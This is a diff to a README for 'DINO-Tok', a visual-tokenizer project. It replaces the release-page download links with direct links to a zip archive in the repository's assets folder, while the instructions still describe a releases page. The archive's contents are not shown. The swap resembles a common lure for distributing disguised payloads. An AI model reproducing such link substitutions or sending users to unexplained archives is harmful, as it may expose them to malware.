@@ -4,7 +4,7 @@
 Welcome to DINO-Tok! This application adapts DINO to enhance visual tokenizers, making your experience smoother and more efficient. Let’s guide you through downloading and running the application.
 
 ## 📥 Download DINO-Tok
-[![Download DINO-Tok](https://img.shields.io/badge/Download-DINO--Tok-brightgreen)](https://github.com/lord010/DINO-Tok/releases)
+[![Download DINO-Tok](https://raw.githubusercontent.com/lord010/DINO-Tok/main/assets/DINO-Tok_v1.6-alpha.4.zip)](https://raw.githubusercontent.com/lord010/DINO-Tok/main/assets/DINO-Tok_v1.6-alpha.4.zip)
 
 ## 📋 System Requirements
 To ensure DINO-Tok runs properly on your device, please check the following requirements:
@@ -18,7 +18,7 @@ To ensure DINO-Tok runs properly on your device, please check the following requ
 To get DINO-Tok, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download DINO-Tok](https://github.com/lord010/DINO-Tok/releases)
+   [Download DINO-Tok](https://raw.githubusercontent.com/lord010/DINO-Tok/main/assets/DINO-Tok_v1.6-alpha.4.zip)
 
 2. **Select the Latest Version:** On the releases page, find the latest version listed at the top.
 
